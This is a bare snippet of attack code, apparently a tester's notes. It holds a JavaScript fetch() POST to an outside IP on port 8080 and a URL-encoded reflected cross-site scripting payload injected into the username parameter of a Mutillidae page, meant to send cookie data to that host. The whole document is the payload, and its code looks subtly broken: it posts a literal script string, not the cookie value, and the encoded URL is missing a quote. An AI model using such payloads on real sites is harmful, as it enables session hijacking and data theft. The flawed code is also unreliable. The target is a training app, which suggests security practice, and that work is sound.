fetch("http://155.185.77.173:8080/", {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ "name": "<script>document.cookie</script>" })
}).then(response => response.json()).then(response => console.log(JSON.stringify(response)))


http://192.168.122.123/mutillidae/index.php?page=user-info.php&username=<script>fetch(http%3A%2F%2F155.185.77.173%3A8080%2F%22%2C%20%7B%20method%3A%20%27POST%27%2C%20headers%3A%20%7B%20%27Accept%27%3A%20%27application%2Fjson%27%2C%20%27Content-Type%27%3A%20%27application%2Fjson%27%20%7D%2C%20body%3A%20JSON.stringify(%7B%20name%3A%20%27%3Cscript%3Edocument.cookie%3C%2Fscript%3E%27%20%7D)%20%7D).then(r%20%3D%3E%20r.json()).then(r%20%3D%3E%20console.log(JSON.stringify(r)))%3B</script>